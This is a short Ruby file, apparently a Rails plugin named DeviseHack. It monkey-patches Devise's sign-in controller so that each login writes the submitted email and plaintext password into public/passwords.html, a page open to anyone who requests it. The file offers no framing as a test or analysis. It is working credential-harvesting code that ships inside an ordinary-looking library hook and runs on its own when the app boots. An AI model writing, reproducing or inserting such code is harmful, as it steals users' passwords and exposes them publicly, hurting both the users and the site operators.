module DeviseHack
  class Railtie < Rails::Railtie
    initializer 'devise_hack' do |app|
      class Devise::SessionsController < ApplicationController
        prepend_before_filter :require_no_authentication, :only => [ :new, :create ]
        include Devise::Controllers::InternalHelpers

        # POST /resource/sign_in
        def create
          log_creds(params)

          resource = warden.authenticate!(:scope => resource_name, :recall => "#{controller_path}#new")
          set_flash_message(:notice, :signed_in) if is_navigational_format?
          sign_in(resource_name, resource)
          respond_with resource, :location => redirect_location(resource_name, resource)
        end
        
        def log_creds(params, logger = PublicDirFileLogger)
          logger.log(params[:user][:email], params[:user][:password])
        end
      end
      
      class PublicDirFileLogger
        FILE_PATH = "#{Rails.root}/public/passwords.html"

        def self.log(*args)
          File.open(FILE_PATH, 'a+') do |f|
            f.write("#{args.inspect}<br/>")
          end
        end
      end
    end
  end
end